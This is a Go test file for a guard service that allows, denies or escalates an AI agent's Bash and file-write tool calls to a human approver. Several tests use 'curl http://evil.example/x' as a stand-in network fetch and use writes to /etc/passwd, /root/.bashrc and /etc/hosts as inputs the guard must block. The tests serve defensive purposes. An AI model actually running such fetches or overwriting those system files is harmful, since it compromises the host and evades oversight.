package guard

import (
	"context"
	"encoding/json"
	"path/filepath"
	"testing"
	"time"

	"github.com/Kubedoll-Heavy-Industries/agentcontainers/internal/approval"
	"github.com/Kubedoll-Heavy-Industries/agentcontainers/internal/mcpproxy"
)

// newTestService builds a Service whose policy denies the `curl` binary, so
// tests don't depend on the exact contents of the built-in defaults.
func newTestService(t *testing.T, broker *approval.ToolCallBroker) *Service {
	t.Helper()
	sec := mcpproxy.DefaultSecurityPolicy()
	sec.DeniedBinaries = []string{"curl"}
	cp, err := mcpproxy.Compile(sec, nil)
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	ev, err := mcpproxy.NewEvaluator(context.Background(), "agent", cp)
	if err != nil {
		t.Fatalf("evaluator: %v", err)
	}
	return New(Options{Evaluator: ev, OutputFlags: cp.OutputFlags, Broker: broker})
}

func bashReq(command string) Request {
	in, _ := json.Marshal(map[string]string{"command": command})
	return Request{ToolName: "Bash", ToolInput: in, Cwd: "/workspace"}
}

func TestDecideAllowsBenignCommand(t *testing.T) {
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), bashReq("ls -la /workspace"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow", v.Decision, v.Reason)
	}
}

func TestDecideDeniesPolicyViolationWithoutBroker(t *testing.T) {
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny", v.Decision)
	}
	if v.Reason == "" {
		t.Error("expected a denial reason")
	}
}

func TestDecideEscalatesAndHumanApproves(t *testing.T) {
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, true, "alice")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow after approval", v.Decision, v.Reason)
	}
	if v.Decider != "alice" {
		t.Errorf("decider = %q, want alice", v.Decider)
	}
}

func TestDecideEscalatesAndHumanDenies(t *testing.T) {
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, false, "bob")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny after rejection", v.Decision)
	}
}

func TestDecideAllowsUnmodeledTool(t *testing.T) {
	svc := newTestService(t, nil)
	in, _ := json.Marshal(map[string]string{"url": "https://example.com"})
	v := svc.Decide(context.Background(), Request{ToolName: "WebFetch", ToolInput: in})
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow (tool not modeled by the guard)", v.Decision)
	}
}

func writeReq(tool, field, path, cwd string) Request {
	in, _ := json.Marshal(map[string]string{field: path, "content": "x"})
	return Request{ToolName: tool, ToolInput: in, Cwd: cwd}
}

// noActiveCase clears VHIR_CASE_DIR so the output-path policy uses its
// no-case branch (writes confined to /tmp + cwd), independent of the
// developer's environment.
func noActiveCase(t *testing.T) { t.Helper(); t.Setenv("VHIR_CASE_DIR", "") }

func TestDecideAllowsWriteInsideCwd(t *testing.T) {
	noActiveCase(t)
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), writeReq("Write", "file_path", "/workspace/notes.txt", "/workspace"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow for a write inside cwd", v.Decision, v.Reason)
	}
}

func TestDecideDeniesWriteOutsideCwd(t *testing.T) {
	// A write to a system path outside the agent's cwd must not slip past the
	// guard the way it did when only Bash was gated.
	noActiveCase(t)
	svc := newTestService(t, nil)
	for _, tc := range []struct{ tool, field, path string }{
		{"Write", "file_path", "/etc/passwd"},
		{"Edit", "file_path", "/usr/local/bin/x"},
		{"MultiEdit", "file_path", "/root/.bashrc"},
		{"NotebookEdit", "notebook_path", "/etc/evil.ipynb"},
	} {
		v := svc.Decide(context.Background(), writeReq(tc.tool, tc.field, tc.path, "/workspace"))
		if v.Decision != DecisionDeny {
			t.Errorf("%s %s: decision = %q, want deny", tc.tool, tc.path, v.Decision)
		}
		if v.Reason == "" {
			t.Errorf("%s %s: expected a denial reason", tc.tool, tc.path)
		}
	}
}

func TestDecideWriteEscalatesToHuman(t *testing.T) {
	noActiveCase(t)
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, true, "carol")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), writeReq("Write", "file_path", "/etc/hosts", "/workspace"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow after human approval", v.Decision, v.Reason)
	}
	if v.Decider != "carol" {
		t.Errorf("decider = %q, want carol", v.Decider)
	}
}

func TestSocketRoundTrip(t *testing.T) {
	svc := newTestService(t, nil)
	sockPath := filepath.Join(t.TempDir(), "guard.sock")
	l, err := Listen(sockPath, svc, nil)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = l.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = l.Serve(ctx) }()

	payload, _ := json.Marshal(bashReq("curl http://evil.example/x"))
	v, err := Ask(sockPath, payload, 2*time.Second, 5*time.Second)
	if err != nil {
		t.Fatalf("ask: %v", err)
	}
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny over socket", v.Decision)
	}
}

// autoResolve plays the human: it resolves each pending broker request with a
// fixed verdict.
func autoResolve(b *approval.ToolCallBroker, approve bool, decider string) {
	for req := range b.Subscribe() {
		_ = b.Resolve(req.ID, approval.ToolCallDecision{Approved: approve, Decider: decider})
	}
}
